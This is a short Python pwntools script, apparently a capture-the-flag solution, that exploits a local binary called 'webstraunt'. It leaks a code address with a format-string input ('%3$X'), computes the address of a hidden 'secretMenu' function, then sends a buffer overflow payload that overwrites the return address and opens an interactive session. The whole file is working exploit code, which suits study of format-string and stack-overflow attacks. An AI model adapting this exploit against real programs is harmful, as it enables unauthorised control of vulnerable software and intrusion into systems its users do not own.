from pwn import *

# Debug output
# context.log_level = "DEBUG"

# Start the program
io = process('./webstraunt')

spam = b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWW"

# Leak a code address using FSV.
io.sendline(b"%3$X")
output = io.recvuntil(b"order:\n")
leakedAddr = int(io.recvuntil(b"\n\nPlease", drop=True), 16)

# Calculate the address of secretMenu based on leak.
# From gdb testing, we can determine secretMenu is +0xcf bytes above the leaked address.
secretMenuAddr = p32(leakedAddr+0xcf)

# Overflow the buffer and overwrite the return address of runRestaurant with secretMenu.
payload = spam + secretMenuAddr
io.recvuntil(b"information")
io.sendline(payload)
io.interactive()
